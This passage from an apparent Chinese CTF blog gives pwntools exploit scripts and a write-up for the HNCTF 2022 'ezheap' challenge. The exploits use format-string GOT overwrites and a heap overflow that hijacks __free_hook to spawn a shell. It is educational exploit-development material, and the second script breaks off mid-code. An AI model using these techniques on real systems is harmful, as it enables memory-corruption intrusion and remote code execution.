class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">22952</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">leave = rop.find_gadget([<span class="string">&#x27;leave&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">info(<span class="string">&quot;leave addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(leave))</span><br><span class="line"></span><br><span class="line">key = <span class="number">0x0000000006010A0</span></span><br><span class="line">offset = <span class="number">0x30</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=fmtstr_payload(<span class="number">6</span>,&#123;<span class="number">0x6010A0</span>:<span class="number">0x66</span>&#125;)</span><br><span class="line">payload2=cyclic(<span class="number">0x38</span>)+p64(<span class="number">0x400610</span>)</span><br><span class="line">payload3=fmtstr_payload(<span class="number">6</span>,&#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]:elf.sym[<span class="string">&#x27;system&#x27;</span>]&#125;)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;What you name?&#x27;</span>,payload1)</span><br><span class="line">sa(<span class="string">&#x27;more about you&#x27;</span>,payload2)</span><br><span class="line">sa(<span class="string">&#x27;Minions?&#x27;</span>,<span class="string">&#x27;sa&#x27;</span>)</span><br><span class="line">sa(<span class="string">&#x27;What you name?&#x27;</span>,payload3)</span><br><span class="line">sa(<span class="string">&#x27;more about you&#x27;</span>,payload2)</span><br><span class="line">sa(<span class="string">&#x27;Minions?&#x27;</span>,<span class="string">&#x27;sa&#x27;</span>)</span><br><span class="line">sa(<span class="string">&#x27;What you name?&#x27;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h2 id="11-12"><a href="#11-12" class="headerlink" title="11.12"></a>11.12</h2><h3 id="HNCTF-2022-WEEK4-ezheap"><a href="#HNCTF-2022-WEEK4-ezheap" class="headerlink" title="[HNCTF 2022 WEEK4]ezheap"></a>[HNCTF 2022 WEEK4]ezheap</h3><p>首先更换一个glibc2.23的ld</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter /home/pwn/pwnenv/glibc-<span class="built_in">all</span>-<span class="keyword">in</span>-one/libs/<span class="number">2.23</span>-0ubuntu11<span class="number">.3</span>_amd64/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span> pwn</span><br></pre></td></tr></table></figure>

<p>然后更换一下libc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so<span class="number">.6</span> ./libc-<span class="number">2.23</span>.so pwn</span><br></pre></td></tr></table></figure>

<p>主代码逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init_env(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy Note.&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = getnum();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        add();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        delete();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>菜单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Delete.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Show.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.Edit.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Choice: &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>添加</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);<span class="comment">//输入id</span></span><br><span class="line">  v3 = getnum();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);<span class="comment">//输入大小</span></span><br><span class="line">  v4 = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v4 &gt; <span class="number">0x100</span> )<span class="comment">//不能大于0x100</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    heaplist[v3] = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);<span class="comment">//首先在heaplist[id]开辟一个0x20的空间</span></span><br><span class="line">    <span class="keyword">if</span> ( !heaplist[v3] )<span class="comment">//当这个空间申请失败，报错</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v0 = heaplist[v3];</span><br><span class="line">    *(_QWORD *)(v0 + <span class="number">16</span>) = <span class="built_in">malloc</span>(v4);<span class="comment">//在他的chunk的0x10位后，存入一个指针，指针指向开辟的一个chunk</span></span><br><span class="line">    *(_QWORD *)(heaplist[v3] + <span class="number">32LL</span>) = &amp;<span class="built_in">puts</span>;<span class="comment">//在他的0x20位后，存入一个puts函数的地址</span></span><br><span class="line">    <span class="keyword">if</span> ( !*(_QWORD *)(heaplist[v3] + <span class="number">16LL</span>) )<span class="comment">//heap的0x10的chunk申请失败，报错</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sizelist[v3] = v4;<span class="comment">//管理size大小的list</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Name: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, (<span class="type">void</span> *)heaplist[v3], <span class="number">0x10</span>uLL) )<span class="comment">//往chunk里面写入0x10的name</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Something error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, *(<span class="type">void</span> **)(heaplist[v3] + <span class="number">16LL</span>), sizelist[v3]) )<span class="comment">//往chunk里面存放的指针的chunk里面写入content内容</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    v1 = heaplist[v3];</span><br><span class="line">    *(_DWORD *)(v1 + <span class="number">24</span>) = <span class="number">1</span>;<span class="comment">//设置chunk的0x18为1</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>删除</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *<span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);</span><br><span class="line">  v1 = getnum();<span class="comment">//获取id</span></span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x10</span> &amp;&amp; *(_DWORD *)(heaplist[v1] + <span class="number">24LL</span>) )<span class="comment">//id不能大于16和他的24位的值为1</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(heaplist[v1] + <span class="number">16LL</span>));<span class="comment">//首先释放掉content</span></span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)heaplist[v1]);<span class="comment">//然后释放掉他自己</span></span><br><span class="line">    sizelist[v1] = <span class="number">0LL</span>;<span class="comment">//设置sizelist为空</span></span><br><span class="line">    *(_DWORD *)(heaplist[v1] + <span class="number">24LL</span>) = <span class="number">0</span>;<span class="comment">//设置使用位为0</span></span><br><span class="line">    *(_QWORD *)(heaplist[v1] + <span class="number">16LL</span>) = <span class="number">0LL</span>;<span class="comment">//设置指向的content chunk为0</span></span><br><span class="line">    result = heaplist;<span class="comment">//设置heaplist的id为空</span></span><br><span class="line">    heaplist[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error idx!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);</span><br><span class="line">  v1 = getnum();<span class="comment">//获取id</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &lt; <span class="number">0x10</span> &amp;&amp; heaplist[v1] )<span class="comment">//不能大于16和不能为空</span></span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="type">void</span> (__fastcall **)(_QWORD))(heaplist[v1] + <span class="number">32LL</span>))(heaplist[v1]);<span class="comment">//puts(name)</span></span><br><span class="line">    <span class="keyword">return</span> (*(__int64 (__fastcall **)(_QWORD))(heaplist[v1] + <span class="number">32LL</span>))(*(_QWORD *)(heaplist[v1] + <span class="number">16LL</span>));<span class="comment">//puts(content)</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error idx!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);</span><br><span class="line">  v1 = getnum();<span class="comment">//获取id</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  nbytes = getnum();<span class="comment">//获取size</span></span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x10</span> &amp;&amp; heaplist[v1] &amp;&amp; nbytes &lt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, *(<span class="type">void</span> **)(heaplist[v1] + <span class="number">16LL</span>), nbytes);<span class="comment">//往chunk里面写入小于0x100字节的数据</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Error idx!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以肯定存在堆溢出</p>
<p>puts遇到<code>\x00</code>​截断，我们知道</p>
<p>​<img src="https://raw.githubusercontent.com/yezere/images/master/image-20241112183135-5cz4moe.png" alt="image">​</p>
<p>我们用edit溢出获取puts，将name指向puts的地址，然后修改free_hook为system，然后内容为<code>/bin/sh</code>​</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">    port = <span class="number">1111</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,name,content</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input your idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Name: &quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span 